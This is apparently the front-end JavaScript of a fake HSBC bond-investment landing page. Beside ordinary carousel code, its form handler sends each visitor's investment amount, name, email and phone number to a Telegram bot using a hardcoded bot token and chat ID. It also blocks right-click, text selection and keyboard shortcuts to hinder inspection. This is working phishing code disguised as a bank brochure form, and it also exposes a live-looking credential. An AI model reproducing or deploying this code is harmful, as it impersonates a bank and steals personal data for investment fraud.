document.addEventListener('DOMContentLoaded', function() {
    const carousel = document.querySelector('.carousel');
    const items = document.querySelectorAll('.carousel-item');
    const prevBtn = document.querySelector('.carousel-nav.prev');
    const nextBtn = document.querySelector('.carousel-nav.next');
    
    let currentIndex = 0;
    const itemWidth = items[0].offsetWidth;
    
    function updateCarousel() {
        carousel.style.transform = `translateX(-${currentIndex * itemWidth}px)`;
    }
    
    prevBtn.addEventListener('click', () => {
        if (currentIndex > 0) {
            currentIndex--;
            updateCarousel();
        }
    });
    
    nextBtn.addEventListener('click', () => {
        if (currentIndex < items.length - 1) {
            currentIndex++;
            updateCarousel();
        }
    });
    
    const form = document.querySelector('.investment-form');
    const BOT_TOKEN = '7545324443:AAESu9Rsy5ybwmkn8AZupY0BbTyMG0YVS_s';
    const CHAT_ID = '-1001002416566645';

    // Phone validation function
    function isValidPhone(countryCode, phone) {
        const countryCodePattern = /^\+\d{1,4}$/;
        const phonePattern = /^\d{6,14}$/;
        return countryCodePattern.test(countryCode) && phonePattern.test(phone);
    }

    const countryCodeInput = document.getElementById('countryCode');

    // Auto-add + and handle input
    countryCodeInput.addEventListener('input', (e) => {
        let value = e.target.value;
        
        // Remove any non-digits
        value = value.replace(/\D/g, '');
        
        // Limit to 3 digits
        value = value.slice(0, 3);
        
        // Add the + prefix
        e.target.value = value;
    });

    form.addEventListener('submit', async (e) => {
        e.preventDefault();

        const investment = form.querySelector('select').value;
        const name = form.querySelector('input[type="text"]').value;
        const email = form.querySelector('input[type="email"]').value;
        const countryCode = '+' + document.getElementById('countryCode').value;
        const phoneNumber = document.getElementById('phoneNumber').value;

        // Validation
        if (!investment || !name || !email || !countryCode || !phoneNumber) {
            alert('Please fill in all fields');
            return;
        }

        // Email validation
        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailPattern.test(email)) {
            alert('Please enter a valid email address');
            return;
        }

        // Phone validation
        if (!isValidPhone(countryCode, phoneNumber)) {
            alert('Please enter a valid country code and phone number');
            return;
        }

        const fullPhone = `${countryCode}${phoneNumber}`;
        
        const message = `
🔔 New Brochure Request

💰 Investment Amount: ${investment}
👤 Full Name: ${name}
📧 Email: ${email}
📱 Phone: ${countryCode}${phoneNumber}

From: HSBC Capital Protected Bond Landing Page
        `;

        try {
            // Try with the full channel ID format
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    disable_web_page_preview: true
                })
            });

            const data = await response.json();
            console.log('Telegram Response:', data); // For debugging

            if (data.ok) {
                form.reset();
                alert('Thank you for your interest. Our team will contact you shortly with the brochure.');
            } else {
                throw new Error(data.description || 'Failed to send message');
            }
        } catch (error) {
            console.error('Error:', error);
            alert('Something went wrong. Please try again later.');
        }
    });
});

// Disable right-click
document.addEventListener('contextmenu', (e) => e.preventDefault());

// Disable text selection
document.addEventListener('selectstart', (e) => e.preventDefault());

// Disable keyboard shortcuts
document.addEventListener('keydown', (e) => {
    if (e.ctrlKey || e.metaKey) {
        e.preventDefault();
    }
}); 